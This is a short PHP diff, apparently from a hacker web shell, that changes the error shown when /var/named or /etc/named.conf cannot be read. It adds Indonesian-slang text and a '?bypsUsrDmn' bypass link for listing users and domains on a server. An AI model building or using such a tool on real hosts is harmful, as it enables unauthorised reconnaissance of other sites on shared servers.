@@ -98,7 +98,9 @@ echo '</center>';
  
 }
 }else{
-echo "<div class='result'><i><font color='#'>ERROR</font><br><font color='red'>/var/named</font> or <font color='red'>/etc/named.conf</font> Not Accessible!</i></div>";
+echo "<div class='result'><i><font color='#'>ERROR</font><br><font color='red'>/var/named</font> or <font color='red'>/etc/named.conf</font> Not Accessible!</i></div>
+<br><br>kalau Tidak Keluar Coba Lewat Sini<br>
+<br><br><a href='?bypsUsrDmn'class='btn cta'>crootkan di dalam</a><br><br> ";
 }
  
 echo "<br>&#169; <font color='red'> ^_^ </font>";
